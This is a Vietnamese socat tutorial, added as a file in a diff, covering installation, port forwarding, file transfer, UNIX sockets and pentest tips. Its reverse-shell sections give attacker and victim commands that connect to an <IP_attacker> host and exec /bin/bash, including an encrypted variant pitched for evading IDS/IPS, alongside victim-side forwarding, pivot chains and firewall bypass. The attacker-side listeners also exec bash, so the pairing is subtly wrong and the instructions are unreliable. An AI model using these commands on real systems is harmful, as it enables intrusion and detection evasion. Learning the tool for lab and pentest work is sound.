@@ -1,0 +1,151 @@
+1. Socat là gì?
+
+    Socat (SOcket CAT) là công cụ dòng lệnh siêu mạnh cho phép chuyển tiếp, kết nối, relay dữ liệu giữa bất kỳ hai endpoint/network socket nào (TCP, UDP, UNIX socket, PTY, file, pipe, SSL, OpenSSL...).
+
+    Được ví như "Netcat + steroids": làm được mọi thứ Netcat làm (và hơn thế), hỗ trợ bảo mật, forward, chain, proxy, encode, nhiều protocol.
+
+2. Cài đặt Socat
+A. Ubuntu/Kali/Debian
+
+sudo apt update
+sudo apt install socat
+
+B. Kiểm tra
+
+socat -V
+
+3. Cú pháp cơ bản của Socat
+
+socat [OPTION] <ADDRESS_TYPE:address1> <ADDRESS_TYPE:address2>
+
+    Mỗi <ADDRESS_TYPE:address> là một endpoint (TCP, UDP, FILE, EXEC, PTY, OPENSSL...)
+
+4. Các ví dụ thực chiến phổ biến
+A. Chuyển tiếp TCP – lắng nghe rồi forward
+
+socat TCP-LISTEN:1234,reuseaddr,fork TCP:10.10.10.20:80
+
+    Lắng nghe port 1234 trên local, forward toàn bộ traffic đến 10.10.10.20:80
+
+    reuseaddr: cho phép reuse socket
+
+    fork: mỗi connection là 1 process
+
+B. Tạo reverse shell an toàn với socat
+1. Attacker (chờ kết nối & bind shell):
+
+socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
+
+2. Victim (kết nối về Attacker):
+
+socat TCP:<IP_attacker>:4444 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
+
+    EXEC:/bin/bash,pty,stderr,...: cung cấp shell real, ổn định hơn nc nhiều.
+
+C. Reverse shell qua OpenSSL (mã hóa, bypass IDS/IPS)
+1. Attacker (chờ shell, tự tạo self-signed cert nếu chưa có):
+
+openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
+socat OPENSSL-LISTEN:4433,cert=cert.pem,key=key.pem,cafile=cert.pem,verify=0 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
+
+2. Victim (kết nối shell đã mã hóa):
+
+socat OPENSSL:<IP_attacker>:4433,verify=0 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
+
+5. Forward port (local/remote/chain/pivot) nâng cao
+A. Local port forward (giống SSH -L)
+
+socat TCP-LISTEN:8080,reuseaddr,fork TCP:127.0.0.1:80
+
+    Truy cập localhost:8080 sẽ chuyển sang localhost:80
+
+B. Remote port forward (giống SSH -R)
+
+# Máy victim mở port 12345, forward về attacker port 8000
+socat TCP-LISTEN:12345,reuseaddr,fork TCP:<IP_attacker>:8000
+
+C. Chained forward (qua nhiều hop)
+
+    Dùng nhiều lệnh socat liên tiếp hoặc chain bằng script, tunnel qua nhiều server/pivot point.
+
+6. UNIX socket, file, pty, chuyển file với socat
+A. Tạo server UNIX socket, nhận data vào file
+
+socat UNIX-LISTEN:/tmp/mysock,fork FILE:/tmp/out.log,append
+
+B. Chuyển file TCP
+
+    Máy nhận:
+
+socat -u TCP-LISTEN:7777,reuseaddr,fork FILE:recv.txt,create
+
+Máy gửi:
+
+    socat -u FILE:send.txt TCP:<IP_target>:7777
+
+C. Clone/forward PTY, debug process
+
+socat -d -d PTY,link=/tmp/serial1,raw,echo=0 TCP:192.168.1.100:2323
+
+    Mô phỏng thiết bị serial, debug, kết nối dịch vụ đặc biệt.
+
+7. Automation, scripting mạnh với socat
+
+    Script hóa relay traffic qua nhiều server, cron job, backup, chuyển log, pivot lab pentest.
+
+    Kết hợp với netcat, ssh, bash để build dynamic pivot, tự động mở tunnel khi agent kết nối về.
+
+    Bypass firewall với socat: thường được dùng khi chỉ có port outbound mở (ví dụ: 80, 443).
+
+8. Một số mẹo mạnh thực chiến
+
+    Phục hồi shell xịn khi reverse shell bị "dumb" (không có tty, không clear ctrl-c):
+
+        Dùng socat reverse shell để lên shell fully interactive, thay vì nc -e.
+
+    Chain nhiều socat để tạo “pivot chain” cho red team/lab.
+
+    Dùng socat để forward cả UNIX socket, API, service độc lạ (docker.sock, mysql.sock...)
+
+    Tích hợp với SSL/TLS, self-signed cert, encryption nâng cao traffic relay.
+
+    Kết hợp với SSH tunnel, socks5 proxy để tạo đường đi an toàn, fake location.
+
+    Debug protocol: dùng socat để relay traffic, log lại bằng FILE hoặc SYSTEM:tee.
+
+    Proxy HTTP/SOCKS qua socat cực nhanh.
+
+9. Fix lỗi thường gặp
+Lỗi	Fix
+Lỗi “Address already in use”	Thêm reuseaddr, kill process cũ, đổi port
+Không lên được shell	Đảm bảo dùng EXEC:/bin/bash,pty,stderr,setsid,sigint,sane, check firewall/route
+Không kết nối được	Mở port trên firewall, NAT, thử port phổ biến hơn (80/443)
+Certificate lỗi	Thêm verify=0, hoặc kiểm tra path cert đúng, thử self-signed
+Không chuyển file được	Dùng -u (unidirectional), file phải tồn tại sẵn (hoặc dùng create)
+Không relay được UNIX socket	Đảm bảo quyền, file socket không bị lock, đúng path
+Chuyển file xong không hết process	Nhớ ctrl+c trên cả 2 máy, file đóng lại thì process tự out
+10. So sánh socat với các tool khác
+Tool	Ưu điểm Socat	Khác biệt
+Socat	Relay, forward, bind, pivot, shell, file, UNIX socket, SSL...	Phức tạp hơn nc, nhiều tham số, phải đọc doc
+Netcat	Nhỏ, nhẹ, port scan, shell nhanh	Không forward đa protocol, không support SSL tốt
+Ncat	Netcat nâng cấp (của Nmap), có SSL, nhưng ít chức năng pivot/unix socket	
+SSH	Tunnel bảo mật, SOCKS, key auth	Không forward socket, không relay file/script tự do như socat
+stunnel/openssl	SSL/TLS tốt	Không pivot, không relay file, không chain endpoint
+11. Tài liệu, link hữu ích
+
+    Socat Manpage
+
+    Socat Cheat Sheet – highon.coffee
+
+    PayloadAllTheThings – Reverse Shells
+
+    Hacktricks Socat
+
+Tóm tắt nhanh
+
+    Socat: công cụ cực mạnh cho pentest/dev/sysadmin – bind shell, reverse shell, port forwarding, pivot, relay file/socket/serial, fake API, proxy, debug network, hỗ trợ encryption SSL, automation pivoting.
+
+    Dùng socat cho mọi workflow netcat làm được (và hơn thế), nhất là khi cần bảo mật hoặc kết nối dịch vụ đặc biệt.
+
+    Chú ý thuộc cú pháp endpoint, phối hợp script, debug traffic, log output, automate lab.
+
